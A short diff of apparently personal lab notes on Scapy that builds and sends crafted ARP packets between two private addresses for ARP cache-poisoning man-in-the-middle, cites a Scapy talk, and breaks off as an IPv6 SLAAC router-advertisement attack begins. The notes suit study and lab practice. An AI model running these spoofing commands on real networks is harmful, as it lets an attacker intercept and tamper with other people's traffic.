@@ -1,9 +1,11 @@
-MitM ARP Cache
-###[ Ethernet ]### 
-  dst       = ff:ff:ff:ff:ff:ff
-  src       = fa:16:3e:a2:90:c8
-  type      = ARP
->>> b.show()
+https://github.com/secdev/scapy - scapy git
+
+MitM ARP Cache         https://scapy.net/conf/scapy_hack.lu.pdf
+z=Ether()
+a=ARP()
+a.psrc="172.16.82.126"
+a.pdst="172.16.82.115"
+>>> a.show()
 ###[ ARP ]### 
   hwtype    = 0x1
   ptype     = IPv4
@@ -11,9 +13,13 @@ MitM ARP Cache
   plen      = None
   op        = who-has
   hwsrc     = fa:16:3e:a2:90:c8
-  psrc      = 172.16.82.106
+  psrc      = 172.16.82.126
   hwdst     = 00:00:00:00:00:00
-  pdst      = 0.0.0.0
+  pdst      = 172.16.82.115
+b=ARP()
+b.psrc="172.16.82.115"
+b.pdst="172.16.82.126"
+>>> b.show()
 ###[ ARP ]### 
   hwtype    = 0x1
   ptype     = IPv4
@@ -26,8 +32,7 @@ MitM ARP Cache
   pdst      = 172.16.82.126
 sendp(z/a)
 sendp(z/b)
-
-
+---------------------------------------------------------------------------------
 IPv6 SLAAC MitM
 a=IPv6()
 b=ICMPv6ND_RA()
